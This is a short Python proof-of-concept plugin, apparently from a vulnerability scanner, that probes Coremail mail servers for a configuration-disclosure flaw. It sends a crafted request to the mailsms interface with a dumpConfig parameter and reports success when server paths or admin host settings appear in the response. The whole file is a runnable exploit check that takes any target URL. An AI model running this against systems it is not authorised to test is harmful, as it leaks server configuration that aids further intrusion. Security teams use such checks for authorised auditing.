#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Coremail 接口存在配置读取",
        "desc": "Coremail mailsms 接口配置存在读取漏洞",
        "grade": "高",
        "type": "web",
        "keyword": "tag:coremail",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&'
        }
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/mailsms/s?func=ADMIN:appState&dumpConfig=/', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code != 404 and ('/home/coremail' in r.text or "MainAdminSvrHost" in r.text):
            return True
        else:
            return False
    except Exception:
        return 

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

